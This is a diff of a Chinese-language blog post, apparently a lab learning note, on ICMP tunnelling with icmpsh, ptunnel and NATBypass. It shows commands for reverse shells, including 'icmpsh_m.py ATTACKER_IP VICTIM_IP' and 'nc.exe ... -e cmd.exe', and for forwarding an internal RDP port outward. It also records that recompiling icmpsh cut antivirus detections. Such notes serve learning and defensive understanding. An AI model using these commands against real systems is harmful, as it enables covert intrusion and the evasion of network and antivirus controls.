@@ -148,7 +148,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    10 分钟 读完 (大约 1484 个字)
+                    10 分钟 读完 (大约 1528 个字)
                 </span>
                 
                 
@@ -172,64 +172,64 @@
 </blockquote>
 <h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>把icmpsh项目从github上下载下来，把其中的icmpsh.exe上传到目标主机。</p>
 <p>Linux作为攻击者服务器则需要安装python的impacket库，我的Parrot系统上已将安装好了。</p>
-<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python-impacket</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo apt install python-impacket</span><br></pre></td></tr></table></figure>
 <p>run.sh脚本里获取网卡和ip地址的方法在我的系统里无效，于把获取命令稍微改了一下，我的网卡名是eth0。</p>
-<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IP=$(ifconfig <span class="hljs-string">"eth0"</span> |grep <span class="hljs-string">"inet "</span>| awk <span class="hljs-string">'&#123; print $2 &#125;'</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">IP=$(ifconfig <span class="hljs-string">"eth0"</span> |grep <span class="hljs-string">"inet "</span>| awk <span class="hljs-string">'&#123; print $2 &#125;'</span>)</span><br></pre></td></tr></table></figure>
 <p>接着以管理员权限运行run.sh脚本，输入目标主机的ip地址，复制给出的命令到目标主机运行。</p>
-<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 110744.png" style="width:100%;"></p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 110744.png" alt></p>
 <p>目标主机执行命令后成功反弹shell。</p>
-<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 111012.png" style="width:100%;"></p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 111012.png" alt></p>
 <p>其实直接运行项目下的icmpsh_m.py效果也是一样的，不过要先手动关闭ping命令的ICMP应答。</p>
-<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br><span class="line">sudo python icmpsh_m.py ATTACKER_IP VICTIM_IP</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br><span class="line"></span><br><span class="line">sudo python icmpsh_m.py ATTACKER_IP VICTIM_IP</span><br></pre></td></tr></table></figure>
 <h3 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h3><p>使用tcpdump抓下192.168.189.129和192.168.189.135之间的所有数据包。</p>
-<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump ip host 192.168.189.129 and 192.168.189.135 -w /tmp/icmp.cap</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo tcpdump ip host 192.168.189.129 and 192.168.189.135 -w /tmp/icmp.cap</span><br></pre></td></tr></table></figure>
 <p>用wireshark打开再去到的数据，可以看到两台主机之间的数据包的协议都是ICMP。</p>
-<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 114239.png" style="width:100%;"></p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 114239.png" alt></p>
 <p>找到了对输入命令请求和响应的两个包，发现他们的内容都明文存储在ICMP报文的Data结构处。</p>
-<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 114448.png" style="width:100%;"></p>
-<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 115130.png" style="width:100%;"></p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 114448.png" alt></p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 115130.png" alt></p>
 <h3 id="杀软查杀情况"><a href="#杀软查杀情况" class="headerlink" title="杀软查杀情况"></a>杀软查杀情况</h3><p>由于能够直接反弹shell，在virustotal几乎一半的厂商都报毒了。</p>
-<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 115457.png" style="width:100%;"></p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 115457.png" alt></p>
 <p>使用源码从新编译的上传上去试试，只有一个厂商报毒。</p>
-<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 120042.png" style="width:100%;"></p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 120042.png" alt></p>
 <h2 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a>ptunnel</h2><p>与icmpsh一样，ptunnel也是基于ICMP协议的工具，但ptunnel是一个纯粹的ICMP隧道，能实现正向隧道的功能。经我测试icmpsh需要两台机器都是公网的才能反弹shell，ptunnel就没这个问题，但使用这个需要管理员权限。Kali和Parrot已有这个工具，也有Windows版，需要自己编译，但无论是我自己编译的，还是GitHub上编译好的都没法在Windows2012上运行，倒是能在Windows10上运行，不知道是不是编译环境的问题，还是他WinPcap库的问题。</p>
 <blockquote>
 <p><a href="https://github.com/ptunnel-win/ptunnel（非官方，貌似官方没发在GitHub上）" target="_blank" rel="noopener">https://github.com/ptunnel-win/ptunnel（非官方，貌似官方没发在GitHub上）</a></p>
 </blockquote>
 <p>自己编译要装好MinGW。</p>
 <p>编译方法：把项目clone下来，再把<strong><a href="http://www.winpcap.org/install/bin/WpdPack_4_0_2.zip" target="_blank" rel="noopener">WinPcap</a></strong>库下载下来，放到同一个项目文件夹里，在使用如下命令编译。</p>
-<figure class="highlight cmd hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc ptunnel.c md5.c -L".\WpdPack\Lib" -I".\WpdPack\Include" -lwpcap -lwsock32 -g -Wall -DWIN32 -o ptunnel.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">gcc ptunnel.c md5.c -L".\WpdPack\Lib" -I".\WpdPack\Include" -lwpcap -lwsock32 -g -Wall -DWIN32 -o ptunnel.exe</span><br></pre></td></tr></table></figure>
 <h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>服务端：</p>
-<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ptunnel</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo ptunnel</span><br></pre></td></tr></table></figure>
 <p>客户端：</p>
-<figure class="highlight cmd hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel.exe -p SERVER_IP -lp <span class="hljs-number">8888</span> -da SERVER_IP -dp <span class="hljs-number">8888</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ptunnel.exe -p SERVER_IP -lp <span class="hljs-number">8888</span> -da SERVER_IP -dp <span class="hljs-number">8888</span></span><br></pre></td></tr></table></figure>
 <p>服务的出现建立Session的字样既成功建立ICMP隧道。</p>
-<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-24 224651.png" style="width:100%;"></p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-24 224651.png" alt></p>
 <p>现在测试下再目标主机反弹个shell，先在攻击者主机监听指定端口，然后再在目标主机用nc反弹个shell到本地监听的端口。<strong>注意顺序不对可能连接不上</strong>，玄学问题。</p>
-<figure class="highlight cmd hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">server:</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-title">nc</span> -<span class="hljs-title">lvp</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-title">client</span>:</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-title">nc.exe</span> 127.0.0.1 3399 -<span class="hljs-title">e</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">System32</span>\<span class="hljs-title">cmd.exe</span></span></span><br></pre></td></tr></table></figure>
-<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-24 225757.png" style="width:100%;"></p>
+<figure class="highlight cmd hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="hljs-function">server:</span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-title">nc</span> -<span class="hljs-title">lvp</span></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-title">client</span>:</span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-title">nc.exe</span> 127.0.0.1 3399 -<span class="hljs-title">e</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">System32</span>\<span class="hljs-title">cmd.exe</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-24 225757.png" alt></p>
 <h4 id="映射3389"><a href="#映射3389" class="headerlink" title="映射3389"></a>映射3389</h4><p>既然都建立了ICMP隧道了，仅仅反弹个shell肯定是不够的，下面就试试内网3389通过ICMP隧道映射到外网。以下是拓扑图：</p>
-<p><img src="/2020/06/25/icmp_tunnel_learning_note/icmp拓扑图.jpg" style="width:100%;"></p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/icmp拓扑图.jpg" alt></p>
 <p>先在Attacker主机开启ptunnel。</p>
-<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ptunnel</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo ptunnel</span><br></pre></td></tr></table></figure>
 <p>再在Server主机ptunnel作为服务端开启本地监听端口。</p>
-<figure class="highlight cmd hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel.exe -p <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">65</span> -lp <span class="hljs-number">3399</span> -da <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">65</span> -dp <span class="hljs-number">3399</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ptunnel.exe -p <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">65</span> -lp <span class="hljs-number">3399</span> -da <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">65</span> -dp <span class="hljs-number">3399</span></span><br></pre></td></tr></table></figure>
 <p>接着在Attacker主机使用lcx类的工具，开启监听模式。这里的lcx类工具我使用的是NATBypass，用go编写，编译成不同可执行文件后可跨平台使用。</p>
 <blockquote>
 <p><a href="https://github.com/cw1997/NATBypass" target="_blank" rel="noopener">https://github.com/cw1997/NATBypass</a></p>
 </blockquote>
-<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./nb -listen 3399 3389</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">./nb -listen 3399 3389</span><br></pre></td></tr></table></figure>
 <p>最后在Server主机使用slave模式，转发3389到ptunnel本地监听的端口。</p>
-<figure class="highlight cmd hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nb.exe -slave <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">3389</span> <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">3399</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nb.exe -slave <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">3389</span> <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">3399</span></span><br></pre></td></tr></table></figure>
 <p>出现accept a new client字样，既成功建立连接。</p>
-<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-25 094141.png" style="width:100%;"></p>
-<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-25 095506.png" style="width:100%;"></p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-25 094141.png" alt></p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-25 095506.png" alt></p>
 <h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>通过ICMP隧道映射3389就这简简单单几条命令，但是遇到命令执行顺序和，一开始使用的GitHub上用C写的跨平台lcx，同网段能通过隧道，不同网段不能的问题，排查起来花了一天，wtcl。</p>
 <h3 id="数据包分析-1"><a href="#数据包分析-1" class="headerlink" title="数据包分析"></a>数据包分析</h3><p>用wireshark抓下反弹shell时的数据包。没有使用密码时，数据包内容跟icmpsh一样，都是明文写在ICMP报文的Data结构里，但是Data结构里还有几十字节的其他内容，可能是记录转发ip和端口之类的内容。</p>
-<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-25 103441.png" style="width:100%;"></p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-25 103441.png" alt></p>
 <p>使用密码时反弹shell的数据包是一样的，可能是在建立隧道时才进行一次密码确认。</p>
 <h3 id="杀软查杀情况-1"><a href="#杀软查杀情况-1" class="headerlink" title="杀软查杀情况"></a>杀软查杀情况</h3><p>ptunnel在virustotal上有五个厂商报毒，其中一个识别出来是ptunnel，总体问题不大。（我怎么记得昨天才有两个报毒的呢-_-!）</p>
-<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-25 101912.png" style="width:100%;"></p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-25 101912.png" alt></p>
 <h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><p>其他类似工具有<strong><a href="https://github.com/esrrhs/pingtunnel" target="_blank" rel="noopener">pingtunnel</a></strong>，用go编写，支持转发tcp、udp和sock5，能够开平台使用。不过我用这个想把3389映射出来时，遇到点问题，没映射成功。</p>
 <h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>以前不知道ping和traceroute有的是什么协议，现在知道了是他们特有的ICMP协议，通过ICMP还了解到这么多妙用:D</p>
 
@@ -354,7 +354,7 @@
                         文章
                     </p>
                     <p class="title has-text-weight-normal">
-                        16
+                        17
                     </p>
                 </div>
             </div>
@@ -374,7 +374,7 @@
                         标签
                     </p>
                     <p class="title has-text-weight-normal">
-                        17
+                        18
                     </p>
                 </div>
             </div>
